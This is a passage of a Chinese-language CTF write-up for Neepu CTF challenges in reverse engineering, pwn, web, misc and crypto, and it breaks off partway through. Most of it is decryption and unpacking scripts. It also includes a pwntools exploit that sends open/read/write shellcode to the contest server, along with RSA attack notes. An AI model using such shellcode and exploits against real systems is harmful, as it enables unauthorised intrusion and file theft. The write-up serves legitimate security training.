class="line">&#x2F;&#x2F;Neepu&#123;Hep10_Ctf&#125;</span><br></pre></td></tr></table></figure><h3 id="ppap"><a href="#ppap" class="headerlink" title="ppap"></a>ppap</h3><p>一个upx加壳程序，直接脱壳没脱起，手动用xdbg脱。</p><p>脱壳后ida分析，可以结合动调分析<br><img src="https://i.loli.net/2021/05/23/UZ2wMm5Xf6n8ql1.png"><br>先网上凯撒解密，得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TcVb2HVxUs77MVzqYTF5WWFkZrzEZVzuMWEmXsn71bzjYUB54WFz</span><br></pre></td></tr></table></figure><p>然后小写转大写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">char flag[]&#x3D;&quot;TcVb2HVxUs77MVzqYTF5WWFkZrzEZVzuMWEmXsn71bzjYUB54WFz&quot;;</span><br><span class="line">int i;</span><br><span class="line"></span><br><span class="line">for(i&#x3D;0;i&lt;53;i++)</span><br><span class="line">&#123;</span><br><span class="line">if(flag[i]&gt;&#x3D;65&amp;&amp;flag[i]&lt;&#x3D;90)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]&#x3D;flag[i]+32;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">if(flag[i]&lt;&#x3D;122&amp;&amp;flag[i]&gt;&#x3D;97)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]&#x3D;flag[i]-32;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;%s&quot;,flag);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;tCvB2hvXuS77mvZQytf5wwfKzRZezvZUmweMxSN71BZJyub54wfZ</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再变表base</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">str1 &#x3D;&#39;tCvB2hvXuS77mvZQytf5wwfKzRZezvZUmweMxSN71BZJyub54wfZ&#39;</span><br><span class="line">string1 &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+&#x2F;&#39;</span><br><span class="line">string2 &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(str1.translate(str.maketrans(string1, string2))))</span><br><span class="line">#Neepu&#123;Sha1_ta1_Yang_De_x1a0_lan_ma@_ya&#125;</span><br></pre></td></tr></table></figure><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>一个注册软件，开始用ida看，始终没找到check入口。后来百度发现，这是python写的注册程序，联想到exe转py(<a href="https://blog.csdn.net/m0_37552052/article/details/88093427">https://blog.csdn.net/m0_37552052/article/details/88093427</a>)。</p><p>命令</p><pre><code>python pyinstxtractor.py [filename]</code></pre><p>得到一个文件夹，里面有一个retest.pyc<br><img src="https://i.loli.net/2021/05/24/2HlqktwYD9JC3aF.png"><br>反编译这个pyc，得到的py文件里面就有flag，命令</p><pre><code>uncompyle6 -o  C:\Users\hp\Downloads\xxx.py C:\Users\hp\Downloads\xxx.pyc</code></pre><p>得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Neepu&#123;vrey_good!!!!!&#125;</span><br></pre></td></tr></table></figure><h3 id="ez"><a href="#ez" class="headerlink" title="ez"></a>ez</h3><p>这道题就是加密函数比较多，rc4，变表base，tea，xtea</p><p>ida分析<br><img src="https://i.loli.net/2021/05/24/FoAfp3bG7R1B8EK.png"><br>下面是tea，xtea加密<br><img src="https://i.loli.net/2021/05/24/18zFluRYdDi4wO9.png"><br>最后的异或处理<br><img src="https://i.loli.net/2021/05/24/Yh9GdVJba7wU5yA.png"></p><p>脚本，先得到8个数</p><p>tea</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void decrypt(unsigned int *code , unsigned int *key)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int delta&#x3D;0x9e3779b9;</span><br><span class="line">    unsigned int v0,v1,sum&#x3D;0xC6EF3720,i;&#x2F;&#x2F; sum&#x3D;0xC6EF3720</span><br><span class="line"></span><br><span class="line">    v0&#x3D;code[0];</span><br><span class="line">    v1&#x3D;code[1];</span><br><span class="line">    for(i&#x3D;0;i&lt;32;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1-&#x3D;( (v0&lt;&lt;4)+key[2] ) ^ (v0+sum) ^ ( (v0&gt;&gt;5)+key[3] );</span><br><span class="line">        v0-&#x3D;( (v1&lt;&lt;4)+key[0] ) ^ (v1+sum) ^ ( (v1&gt;&gt;5)+key[1] );</span><br><span class="line">        sum-&#x3D;delta;</span><br><span class="line">    &#125;</span><br><span class="line">    code[0]&#x3D;v0;</span><br><span class="line">    code[1]&#x3D;v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int key[4]&#x3D;&#123;2,2,3,4&#125;;</span><br><span class="line">    unsigned int code[2]&#x3D;&#123;0x24BDF90F,0x301B88E8&#125;;</span><br><span class="line"></span><br><span class="line">    decrypt(code,key);</span><br><span class="line">    printf(&quot;%x %x&quot;,code[0],code[1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xtea</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void decrypt(unsigned int r ,unsigned int *code ,unsigned int *key)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int v0,v1,i,delta&#x3D;0x9e3779b9;</span><br><span class="line">    unsigned int sum&#x3D;delta*r;</span><br><span class="line"></span><br><span class="line">    v0&#x3D;code[0];</span><br><span class="line">    v1&#x3D;code[1];</span><br><span class="line">    for(i&#x3D;0;i&lt;r;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1-&#x3D;( ((v0&lt;&lt;4) ^(v0&gt;&gt;5)) +v0 ) ^ ( sum + key[ (sum&gt;&gt;11)&amp;3 ]);</span><br><span class="line">        sum-&#x3D;delta;</span><br><span class="line">        v0-&#x3D;( ((v1&lt;&lt;4) ^ (v1&gt;&gt;5)) +v1 ) ^ ( sum + key[sum&amp;3] );</span><br><span class="line">    &#125;</span><br><span class="line">    code[0]&#x3D;v0;</span><br><span class="line">    code[1]&#x3D;v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int key[4]&#x3D;&#123;2,2,3,4&#125;;</span><br><span class="line">    unsigned int r&#x3D;32;</span><br><span class="line">    unsigned int code[2]&#x3D;&#123;0x8DD02793,0x4F558864&#125;;</span><br><span class="line"></span><br><span class="line">    decrypt(r,code,key);</span><br><span class="line">    printf(&quot;%x %x&quot;,code[0],code[1]); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>得到v4[]={1 1 3 4 2 5 8 7}，排序后v4[]={1,1,2,3,4,5,7,8};</p><p>然后异或解密+变表base+rc4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int v9[48];</span><br><span class="line">int v7[48]&#x3D;&#123;0&#125;;</span><br><span class="line">int v4[]&#x3D;&#123;1,1,2,3,4,5,7,8&#125;;</span><br><span class="line">char a[]&#x3D;&#123;0xa5,0x4c,0xb6,0xea,0xd0,0xb9,0xb6,0x50,0x40,0xa4,0xda,0x37,0xe4,0xa,0x98,0xf7,0x5e,0x42,0x7f,0x1f,0x2,0xca,0x4e,0x9c,0x96,0xb4,0xdb,0x90,0xa7,0x15,0x12&#125;;</span><br><span class="line">char key[]&#x3D;&#123;0x94,0x75,0x81,0xd2,0xfd,0x81,0x9b,0x62,0x73,0xe4,0x91,0x58,0x86,0x6f,0xd8,0xb5,0x3f,0x31,0x14,0x7a,0x76,0xa8,0x2f,0xf0,0xfa,0x97,0xff,0xb5,0xf9,0x33,0x38&#125;;</span><br><span class="line">int i;</span><br><span class="line"></span><br><span class="line">v9[0] &#x3D; 81;</span><br><span class="line"> v9[1] &#x3D; 116;</span><br><span class="line">v9[2] &#x3D; 91;</span><br><span class="line">v9[3] &#x3D; 49;</span><br><span class="line">v9[4] &#x3D; 50;</span><br><span class="line">v9[5] &#x3D; 81;</span><br><span class="line">v9[6] &#x3D; 100;</span><br><span class="line">v9[7] &#x3D; 61;</span><br><span class="line">v9[8] &#x3D; 85;</span><br><span class="line">v9[9] &#x3D; 77;</span><br><span class="line">v9[10] &#x3D; 96;</span><br><span class="line">v9[11] &#x3D; 98;</span><br><span class="line">v9[12] &#x3D; 84;</span><br><span class="line">v9[13] &#x3D; 107;</span><br><span class="line">v9[14] &#x3D; 72;</span><br><span class="line">v9[15] &#x3D; 59;</span><br><span class="line">v9[16] &#x3D; 52;</span><br><span class="line">v9[17] &#x3D; 96;</span><br><span class="line">v9[18] &#x3D; 83;</span><br><span class="line">v9[19] &#x3D; 122;</span><br><span class="line">v9[20] &#x3D; 61;</span><br><span class="line">v9[21] &#x3D; 52;</span><br><span class="line">v9[22] &#x3D; 50;</span><br><span class="line">v9[23] &#x3D; 107;</span><br><span class="line">v9[24] &#x3D; 71;</span><br><span class="line">v9[25] &#x3D; 89;</span><br><span class="line">v9[26] &#x3D; 58;</span><br><span class="line">v9[27] &#x3D; 96;</span><br><span class="line">v9[28] &#x3D; 93;</span><br><span class="line">v9[29] &#x3D; 78;</span><br><span class="line">v9[30] &#x3D; 49;</span><br><span class="line">v9[31] &#x3D; 75;</span><br><span class="line">v9[32] &#x3D; 77;</span><br><span class="line">v9[33] &#x3D; 83;</span><br><span class="line">v9[34] &#x3D; 118;</span><br><span class="line">v9[35] &#x3D; 65;</span><br><span class="line">v9[36] &#x3D; 79;</span><br><span class="line">v9[37] &#x3D; 110;</span><br><span class="line">v9[38] &#x3D; 68;</span><br><span class="line">v9[39] &#x3D; 126;</span><br><span class="line">v9[40] &#x3D; 100;</span><br><span class="line">v9[41] &#x3D; 70;</span><br><span class="line">v9[42] &#x3D; 63;</span><br><span class="line">v9[43] &#x3D; 62;</span><br><span class="line">v9[44] &#x3D; 4;</span><br><span class="line">v9[45] &#x3D; 5;</span><br><span class="line">v9[46] &#x3D; 7;</span><br><span class="line">v9[47] &#x3D; 8;</span><br><span class="line">  </span><br><span class="line">  for(i&#x3D;0;i&lt;48;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  v7[i]&#x3D;v9[i]^v4[i%8];</span><br><span class="line">  printf(&quot;%c&quot;,v7[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;\nNeepu&#123;&quot;);</span><br><span class="line">  for(i&#x3D;0;i&lt;31;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  printf(&quot;%c&quot;,a[i]^key[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;&#125;&quot;);</span><br><span class="line">  </span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F;PuY26Tc5TLbaPnO35aQy915cFX8cYK6CLRtBKkCveG&#x3D;&#x3D;</span><br><span class="line">&#x2F;&#x2F;Neepu&#123;1978-8-23@Kobe@Basketball#$%^&amp;*&#125;</span><br></pre></td></tr></table></figure><h3 id="flag管理系统"><a href="#flag管理系统" class="headerlink" title="flag管理系统"></a>flag管理系统</h3><p>一个腾讯加壳后的apk，脱壳<a href="https://zhuanlan.zhihu.com/p/45591754">https://zhuanlan.zhihu.com/p/45591754</a><br><img src="https://i.loli.net/2021/05/24/yl5eTgFWOiIHvQX.png"></p><p>脱壳后拖到jeb分析</p><p>不断分析，找到这个位置<br><img src="https://i.loli.net/2021/05/24/FQndWBISChX8emY.png"><br>然后直接登录，就可以得到flag了<br><img src="https://i.loli.net/2021/05/24/LdiRjvVKFQwb91A.png"></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="ncc"><a href="#ncc" class="headerlink" title="ncc"></a>ncc</h3><p>ida打开文件，发现就是一个命令行传入参数切割后要是2333<br><img src="https://i.loli.net/2021/05/24/mlIoH4PNbdk9yCj.png"><br>所以直接nc连接，后传入参数2333_2333就行了。<br><img src="https://i.loli.net/2021/05/24/OFH6YZo2hQsrKdj.png"></p><h3 id="easy-shellcode"><a href="#easy-shellcode" class="headerlink" title="easy_shellcode"></a>easy_shellcode</h3><p>利用write() read() 等系统调用去读取目标主机中的flag<br><img src="https://i.loli.net/2021/05/24/GbqprH982kc57wU.png"><br>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch &#x3D; &#39;amd64&#39;, os &#x3D; &#39;linux&#39;)</span><br><span class="line"></span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">p &#x3D; remote(&#39;neepusec.club&#39;, 18707)</span><br><span class="line"></span><br><span class="line">shellcode&#x3D;&#39;&#39;&#39;</span><br><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">xor rsi,rsi</span><br><span class="line">push 64</span><br><span class="line">pop rdx</span><br><span class="line">syscall</span><br><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor rax,rax</span><br><span class="line">syscall</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">sc&#x3D;asm(shellcode,arch&#x3D;&#39;amd64&#39;,os&#x3D;&#39;linux&#39;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line"># step 2</span><br><span class="line">payload &#x3D; sc</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>getflag<br><img src="https://i.loli.net/2021/05/24/kmyTiSoeaExGOPg.png"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="LOVE-DEATH-amp-ROBOTS"><a href="#LOVE-DEATH-amp-ROBOTS" class="headerlink" title="LOVE_DEATH&amp;ROBOTS"></a>LOVE_DEATH&amp;ROBOTS</h3><p>打开网站查看robots.txt</p><p>发现网页，然后查看源码得到flag</p><h3 id="remote-table"><a href="#remote-table" class="headerlink" title="remote_table"></a>remote_table</h3><p>乱点，发现有个notfund.html</p><p>查看源码发现flag</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="龙会说话吗"><a href="#龙会说话吗" class="headerlink" title="龙会说话吗"></a>龙会说话吗</h3><p>两个文件<br><img src="https://i.loli.net/2021/05/24/Lr6wy19Ytg4mbah.png"></p><p>第一个文件使用foremost 分离</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost dragon</span><br></pre></td></tr></table></figure><p>得到图片，这是上古卷轴中的龙文<br><img src="https://i.loli.net/2021/05/24/EgqG1p6b3woZsKu.png"></p><p>翻译一下是youseethedragon</p><p>解开音频文件密码</p><p>使用silenteye,分离音频文件中的flag.txt</p><p>base64解密得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Neepu&#123;Y0U_c4N_5p3ak_D74g0n_L4nge&#125;</span><br></pre></td></tr></table></figure><h3 id="15-Puzzle"><a href="#15-Puzzle" class="headerlink" title="15 Puzzle!"></a>15 Puzzle!</h3><p>数字华容道，玩出来<br><img src="https://i.loli.net/2021/05/24/6MTBxDVZKrcjwJX.jpg"></p><h3 id="coin"><a href="#coin" class="headerlink" title="coin"></a>coin</h3><p>一直买进最后一种硬币</p><p>直到最后一种硬币的价格降为负数</p><p>然后再继续买进，会反得到钱</p><p>最后得到flag<br><img src="https://i.loli.net/2021/05/24/oaGJIC6Y1DN7p5L.png"></p><h2 id="noob"><a href="#noob" class="headerlink" title="noob"></a>noob</h2><h3 id="linux入门"><a href="#linux入门" class="headerlink" title="linux入门"></a>linux入门</h3><p>hint.txt说flag在根目录，最后在下面的目录下找到</p><pre><code>grep -r Neep /etc</code></pre><p>getflag<code>/etc/neepu.conf:Neepu&#123;ec65303a-594a-471b-842c-55ba49fffc74&#125;</code></p><h3 id="最强大脑"><a href="#最强大脑" class="headerlink" title="最强大脑"></a>最强大脑</h3><p>100道嘛，没技术，cv工程师。</p><pre><code>&gt;&gt;&gt; 4051411 + 736980711421218&gt;&gt;&gt; 1927490 * 34068036566578714470&gt;&gt;&gt; 2103378 + 47674146870792&gt;&gt;&gt; 9851522 + 755735617408878&gt;&gt;&gt; 7849095 - 40603603788735&gt;&gt;&gt; 3676374 * 4617691697635545606&gt;&gt;&gt; 8761933 * 764939367023468956669&gt;&gt;&gt; 4366584 + 37915058158089&gt;&gt;&gt; 6187043 + 386851910055562&gt;&gt;&gt; 915470 - 1468721-553251&gt;&gt;&gt; 7114910 * 417178029681839239800&gt;&gt;&gt; 3709127 * 720093926709197270253&gt;&gt;&gt; 5630669 * 4696362644364866484&gt;&gt;&gt; 839781 - 3900794-3061013&gt;&gt;&gt; 5749805 + 27560488505853&gt;&gt;&gt; 5802392 * 596496634611070998672&gt;&gt;&gt; 2922467 - 4633303-1710836&gt;&gt;&gt; 5684999 + 28397968524795&gt;&gt;&gt; 3901163 - 9410974-5509811&gt;&gt;&gt; 2101683 - 7035072-4933389&gt;&gt;&gt; 3045929 * 838389425536745867526&gt;&gt;&gt; 9461518 - 7752498686269&gt;&gt;&gt; 2070079 * 906254718760188231213&gt;&gt;&gt; 1372378 * 33245594562551631302&gt;&gt;&gt; 7935742 - 9654162-1718420&gt;&gt;&gt; 7471885 * 314317423485434662990&gt;&gt;&gt; 5233253 + 21308137364066&gt;&gt;&gt; 3733553 - 15457962187757&gt;&gt;&gt; 4607382 - 4660512-53130&gt;&gt;&gt; 5294353 * 975186351629805129639&gt;&gt;&gt; 7134216 + 756734214701558&gt;&gt;&gt; 7338456 - 7831906-493450&gt;&gt;&gt; 4329962 - 5722123-1392161&gt;&gt;&gt; 4089460 * 451564318466541422780&gt;&gt;&gt; 2500797 + 910634911607146&gt;&gt;&gt; 6490141 + 7208907211031&gt;&gt;&gt; 941026 * 23547192215851801694&gt;&gt;&gt; 4927762 * 389257119181663456102&gt;&gt;&gt; 9236915 - 9986229-749314&gt;&gt;&gt; 8508956 - 20310146477942&gt;&gt;&gt; 5909116 * 8950195288771093204&gt;&gt;&gt; 5446863 * 336659818337398082074&gt;&gt;&gt; 7110459 - 13186225791837&gt;&gt;&gt; 4619014 + 12880775907091&gt;&gt;&gt; 6086609 + 14077367494345&gt;&gt;&gt; 8255658 + 992235618178014&gt;&gt;&gt; 2028134 + 68685078896641&gt;&gt;&gt; 784992 - 6018989-5233997&gt;&gt;&gt; 3654529 - 330513621478&gt;&gt;&gt; 8342583 - 6899177652666&gt;&gt;&gt; 17 ** 483521&gt;&gt;&gt; 45 % 21&gt;&gt;&gt; 59 ** 8146830437604321&gt;&gt;&gt; 25 % 21&gt;&gt;&gt; 93 ** 760170087060757&gt;&gt;&gt; 68 ** 3314432&gt;&gt;&gt; 73 % 53&gt;&gt;&gt; 26 ** 78031810176&gt;&gt;&gt; 16 % 51&gt;&gt;&gt; 18 % 108&gt;&gt;&gt; 75 % 10&gt;&gt;&gt; 68 % 75&gt;&gt;&gt; 9 ** 281&gt;&gt;&gt; 49 % 21&gt;&gt;&gt; 27 ** 4531441&gt;&gt;&gt; 24 % 73&gt;&gt;&gt; 100 % 84&gt;&gt;&gt; 17 ** 102015993900449&gt;&gt;&gt; 23 % 65&gt;&gt;&gt; 99 ** 59509900499&gt;&gt;&gt; 86 % 32&gt;&gt;&gt; 25 % 97&gt;&gt;&gt; 87 ** 187&gt;&gt;&gt; 70 % 100&gt;&gt;&gt; 73 ** 428398241&gt;&gt;&gt; 84 % 40&gt;&gt;&gt; 63 % 43&gt;&gt;&gt; 97 ** 197&gt;&gt;&gt; 72 % 72&gt;&gt;&gt; 14 % 42&gt;&gt;&gt; 36 ** 21296&gt;&gt;&gt; 74 ** 429986576&gt;&gt;&gt; 36 ** 62176782336&gt;&gt;&gt; 40 ** 140&gt;&gt;&gt; 51 % 63&gt;&gt;&gt; 66 % 42&gt;&gt;&gt; 1 % 101&gt;&gt;&gt; 8 ** 264&gt;&gt;&gt; 13 % 41&gt;&gt;&gt; 25 % 10&gt;&gt;&gt; 3 ** 327&gt;&gt;&gt; 75 % 30&gt;&gt;&gt; 46 ** 820047612231936&gt;&gt;&gt; 48 ** 148&gt;&gt;&gt; 63 % 70&gt;&gt;&gt; 60 ** 8167961600000000&gt;&gt;&gt; 96 % 10&gt;&gt;&gt; 84 % 84&gt;&gt;&gt; 46 % 91&gt;&gt;&gt; 71 % 98</code></pre><p>flag没保存下来，也不想在弄了。。。</p><h3 id="AZ"><a href="#AZ" class="headerlink" title="AZ"></a>AZ</h3><p>在这里找到flag<br><img src="https://i.loli.net/2021/05/24/QowDNyuxXCYi8tS.png"></p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="古代密码加密"><a href="#古代密码加密" class="headerlink" title="古代密码加密"></a>古代密码加密</h3><p>一开始解不出，得到官方hint</p><p>得到png文件，改为png.png得到反切密码表</p><p><img src="https://i.loli.net/2021/05/24/CB7Is1ih3tdekmY.png"></p><p>根据该对使得flag有头有尾</p><p>查看对的意思，百度搜索得到，对的解密为两个141 分别放在flag头尾</p><p>诗使得flag有声有调</p><p>根据反切密码的格式，先拿第一排的声母，再拿第二排的韵母，最后加上声调</p><p>最后的flag为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Neepu&#123;141181832310414124141&#125;</span><br></pre></td></tr></table></figure><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><p>chall1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1 = <span class="built_in">pow</span>(m, <span class="number">7</span>, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m+e, <span class="number">7</span>, n)</span><br></pre></td></tr></table></figure><p>注意到e很小且diff<code>e = nextprime(random.randint(1,1000))</code>联想到<code>related_message_attack</code>解出m和e</p><p>chall2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">m &#x3D; encode(p, q, e)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">def encode (p1,p2,e):</span><br><span class="line">    not_hint &#x3D; (p1 + 1) * (p2 + 1)</span><br><span class="line">    S &#x3D; gmpy2.invert(e, not_hint)</span><br><span class="line">    not_p &#x3D; S%(p1+1)</span><br><span class="line">    return not_p</span><br></pre></td></tr></table></figure><p>由于m已知,且整个S在<code>mod (p1+1)</code>条件下,联想到dp泄漏,通常K很小,通过爆破K解出flag</p><p>exp </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 